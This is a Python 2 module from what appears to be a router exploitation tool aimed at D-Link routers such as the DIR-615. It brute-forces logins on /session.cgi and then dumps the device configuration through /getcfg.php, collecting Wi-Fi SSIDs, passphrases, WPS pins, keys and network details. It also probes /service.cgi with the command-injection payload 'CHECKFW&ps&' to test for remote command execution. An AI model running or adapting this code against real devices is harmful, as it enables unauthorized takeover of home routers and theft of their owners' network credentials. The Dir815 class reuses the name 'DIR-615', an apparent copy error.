import json
import random
import re
import string
import sys

import requests

from __init__ import RouterBase

regex_list = ['Product Page : <a href="http://support.dlink.com" target="_blank">(.*?)<']


class Base(RouterBase):

    def __init__(self, url, rex, url_page):
        super(RouterBase, self).__init__()
        self.page = url_page
        self.url = url
        self.regex_found = rex
        self.results = {"url": url}
        self.__id_regex()

    def _finalize_results(self):
        self.results["name"] = self.model.name
        self.results["version"] = self.model.get_version(self.page)
        self.results = self.model.enumeration(self.results)
        self._print_results()

    def _print_results(self):
        print "+" + ("-" * 80)
        print "|" + self.results["url"]
        print "+" + ("-" * 80)
        print "| Router Name: " + str(self.results["name"])
        print "| Router Username: " + str(self.results["username"])
        print "| Router Password: " + str(self.results["password"])
        print "| Router RCE Available: " + str(self.results["shell_support"])
        print "| Router SSID: " + str(self.results["ssid"])
        print "| Router SSID Phrase: " + str(self.results["passphrase"])
        print "| Router SSID Pin: " + str(self.results["pin"])
        print "+" + ("-" * 80)
        print


    def __id_regex(self):
        for i in globals().keys():
            r = self.rex_to_func()

            if i.startswith(r):
                self.model = getattr(sys.modules[__name__], r)()
                return True

        self.model = Generic()

    def start(self):
        for u, p in self.brute_force_combos:
            if self.model.start_brute_force(self.url, u, p):
                self.results["username"] = u
                self.results["password"] = p
                self._finalize_results()
                return True

        return False


class Generic(object):

    def __init__(self):
        self.name = "Generic or Unknown"
        self.version = "Unknown"
        self.headers = {"Cookie": "uid=" + ''.join(random.choice(string.letters) for _ in range(10)),
                        "Host": "localhost",
                        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
                        }

    def _attempt_shell(self, res):
        post_content = {"EVENT": "CHECKFW&ps&"}
        attempt = 0
        res["shell_support"] = False

        while attempt < 3:
            try:
                r = requests.post(res["url"] + "/service.cgi", data=post_content, headers=self.headers)
            except requests.exceptions.ConnectionError:
                return res
            except requests.exceptions.ChunkedEncodingError:
                attempt += 1
            else:
                break

        if not (r.status_code == 200 and r.reason == "OK"):
            return res

        if not re.search("<message>Not authorized</message>", r.text):
            res["shell_support"] = True
            res["shell_poc"] = r.text
            return res

    def _results_xml_parser(self, regex, text):
        res = re.findall(regex, text)
        sorted_list = []

        for i in res:
            if i.strip() not in sorted_list:
                sorted_list.append(i.strip())

        return sorted_list
        #return json.dumps(sorted_list)

    def start_brute_force(self, url, username, password):
        post_content = {"REPORT_METHOD": "xml",
                        "ACTION": "login_plaintext",
                        "USER": username,
                        "PASSWD": password,
                        "CAPTCHA": ""
                        }

        try:
            r = requests.post(url + "/session.cgi", data=post_content, headers=self.headers)
        except requests.exceptions.ConnectionError:
            print "Error: Failed to access " + url + "/session.cgi"
            return False

        if not (r.status_code == 200 and r.reason == "OK"):
            return False

        if re.search("<RESULT>SUCCESS</RESULT>", r.text):
            print "Success: " + url + " user: " + username + " pass: " + password
            return True

    def get_version(self, index):
        return

    def enumeration(self, results_dic):
        #Adding all the services I can find, can parse this better later!
        post_content = {"SERVICES": "WIFI,WIFI.WLAN-2,WIFI.WLAN-1,WIFI.PHYINF,WAN,WAN.RESTART,VSVR.NAT-2,VSVR.NAT-1," 
                                    "URLCTRL,UPNP.LAN-1,UPNP.BRIDGE-1,STARSPEED.WAN-1,SMS,SCHEDULE,RUNTIME.WPS.WLAN-1," 
                                    "RUNTIME.UPNP.PORTM,RUNTIME.TTY,RUNTIME.TIME,RUNTIME.ROUTE.DYNAMIC,RUNTIME.PHYINF," 
                                    "RUNTIME.PHYINF.WLAN-2,RUNTIME.PHYINF.WLAN-1,RUNTIME.PHYINF.ETH-3," 
                                    "RUNTIME.PHYINF.ETH-2,RUNTIME.PHYINF.ETH-1,RUNTIME.OPERATOR,RUNTIME.LOG,RUNTIME.INF," 
                                    "RUNTIME.INF.WAN-4,RUNTIME.INF.WAN-3,RUNTIME.INF.WAN-2,RUNTIME.INF.WAN-1," 
                                    "RUNTIME.INF.LAN-4,RUNTIME.INF.LAN-2,RUNTIME.INF.LAN-1,RUNTIME.INF.BRIDGE-1," 
                                    "RUNTIME.DFS,RUNTIME.DEVICE,RUNTIME.DDNS4.WAN-1,RUNTIME.CONNSTA,ROUTE6.STATIC," 
                                    "ROUTE6.DYNAMIC,ROUTE.STATIC,ROUTE.IPUNNUMBERED,ROUTE.DESTNET,QOS,PORTT.NAT-1," 
                                    "PHYINF.WIFI,PHYINF.WAN-1,PHYINF.LAN-1,PHYINF.BRIDGE-1,PFWD.NAT-2,PFWD.NAT-1," 
                                    "NETSNIPER.NAT-1,NAT,MULTICAST,MACCTRL,LAN,IUM,INF,INET,INET.WAN-4,INET.WAN-3," 
                                    "INET.WAN-2,INET.WAN-1,INET.LAN-4,INET.LAN-3,INET.LAN-2,INET.LAN-1,INET.INF," 
                                    "INET.BRIDGE-1,ICMP.WAN-3,ICMP.WAN-2,ICMP.WAN-1,HTTP.WAN-3,HTTP.WAN-2,HTTP.WAN-1," 
                                    "FIREWALL6,FIREWALL,FIREWALL-3,FIREWALL-2,DNS4,DNS4.LAN-2,DNS4.LAN-1,DMZ.NAT-2," 
                                    "DMZ.NAT-1,DHCPS6.LAN-4,DHCPS6.LAN-3,DHCPS6.LAN-2,DHCPS6.LAN-1,DHCPS6.INF," 
                                    "DHCPS6.BRIDGE-1,DHCPS4.LAN-2,DHCPS4.LAN-1,DHCPS4.INF,DEVICE.TIME,DEVICE.RDNSS," 
                                    "DEVICE.PASSTHROUGH,DEVICE.LOG,DEVICE.LAYOUT,DEVICE.HOSTNAME,DEVICE.DIAGNOSTIC," 
                                    "DEVICE.ACCOUNT,DDNS4.WAN-3,DDNS4.WAN-2,DDNS4.WAN-1"}

        try:
            r = requests.post(results_dic["url"] + "/getcfg.php", data=post_content, headers=self.headers)
        except requests.exceptions.ConnectionError:
            print "Error: Failed to access " + results_dic["url"] + "/getcfg.php"
            return False

        if not (r.status_code == 200 and r.reason == "OK"):
            return False

        results_dic["domain"] = self._results_xml_parser("<domain>(.*?)</domain>", r.text)
        results_dic["pin"] = self._results_xml_parser("<pin>(.*?)</pin>", r.text)
        results_dic["mac_address"] = self._results_xml_parser("<macaddr>(.*?)</macaddr>", r.text)
        results_dic["ip_address"] = self._results_xml_parser("<ipaddr>(.*?)</ipaddr>", r.text)
        results_dic["hostnames"] = self._results_xml_parser("<hostname>(.*?)</hostname>", r.text)
        results_dic["name"] = self._results_xml_parser("<modelname>(.*?)</modelname>", r.text)[2:-2]
        results_dic["gateway"] = self._results_xml_parser("<gateway>(.*?)</gateway>", r.text)
        results_dic["ssid"] = self._results_xml_parser("<ssid>(.*?)</ssid>", r.text)
        results_dic["passphrase"] = self._results_xml_parser("<passphrase>(.*?)</passphrase>", r.text)
        results_dic["key"] = self._results_xml_parser("<key>(.*?)</key>", r.text)
        results_dic["dns_servers"] = self._results_xml_parser("<raw_dns>(.*?)</raw_dns>", r.text)
        results_dic["version"] = self._results_xml_parser("<firmwareversion>(.*?)</firmwareversion>", r.text)[2:-2]
        results_dic["locale_time"] = self._results_xml_parser("<localename>(.*?)</localename>", r.text)
        results_dic["description"] = self._results_xml_parser("<description>(.*?)</description>", r.text)
        results_dic["full_output"] = r.text

        return self._attempt_shell(results_dic)


class Dir615(Generic):

    def __init__(self):
        super(Generic, self).__init__()
        self.name = "DIR-615"
        self.version = "Unknown"
        self.headers = {"Cookie": "uid=" + ''.join(random.choice(string.letters) for _ in range(10)),
                        "Host": "localhost",
                        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
                        }

    def get_version(self, index):
        try:
            self.version = re.findall("Firmware Version : (.*?)</span>", index)[0]
        except IndexError:
            pass


class Dir815(Dir615):

    def __init__(self):
        super(Dir615, self).__init__()
        self.name = "DIR-615"

